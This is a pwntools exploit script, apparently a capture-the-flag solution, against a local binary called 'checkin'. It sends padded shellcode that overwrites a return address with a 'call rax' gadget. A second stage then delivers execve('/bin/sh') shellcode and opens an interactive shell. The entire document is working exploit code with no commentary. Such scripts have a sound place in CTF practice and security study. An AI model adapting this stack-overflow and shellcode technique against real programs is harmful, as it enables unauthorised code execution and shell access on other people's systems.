from pwn import *

shellcode = '\xb2\xff\x48\x89\xc6\x49\x89\xc2\x48\x31\xff\x48\x31\xc0\x0f\x05\x41\xff\xe2'

call_rax = 0x000000000040070d
r = process('./checkin')

shellcode = shellcode.ljust(0xe+8, 'a')
shellcode += p32(call_rax)
shellcode = shellcode.ljust(28, '\x00')
print r.recvuntil(':')
r.sendline(shellcode)

sleep(1)

execsh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shellcode2 = '\x49\x83\xc2\x13\x41\xff\xe2\xc2\x48\x31\xff\x48\x31\xc0\x0f\x05\x41\xff\xe2' 
shellcode2 += execsh
r.sendline(shellcode2)

r.interactive()
